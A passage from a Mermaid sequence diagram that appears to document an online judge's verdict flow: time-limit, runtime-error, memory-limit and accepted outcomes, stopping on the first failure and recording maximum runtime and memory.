            Worker ->> Verdict: 6. TLE - Time Limit Exceeded<br/>Test N timeout<br/>STOP execution
            Verdict -->> Worker: Final: TLE
        else Runtime Error
            Container -->> Worker: 4d. Exit 139<br/>Segmentation fault
            Worker ->> Verdict: 7. RE - Runtime Error<br/>Test N crashed<br/>STOP execution
            Verdict -->> Worker: Final: RE
        else Memory Limit Exceeded
            Container -->> Worker: 4e. OOMKilled<br/>Memory exceeded 512MB
            Worker ->> Verdict: 8. MLE - Memory Limit Exceeded<br/>Test N OOM<br/>STOP execution
            Verdict -->> Worker: Final: MLE
        end
    end

    alt All Tests Passed
        Worker ->> Verdict: 9. All 10 tests passed<br/>passed = 10, failed = 0
        Verdict -->> Worker: Final: AC - Accepted
    end

    Worker ->> Worker: 10. Record metrics<br/>runtime: max across all tests<br/>memory: max across all tests
    Note over Worker, Verdict: Verdict determined<br/>Stop on first failure<br/>or all tests pass
```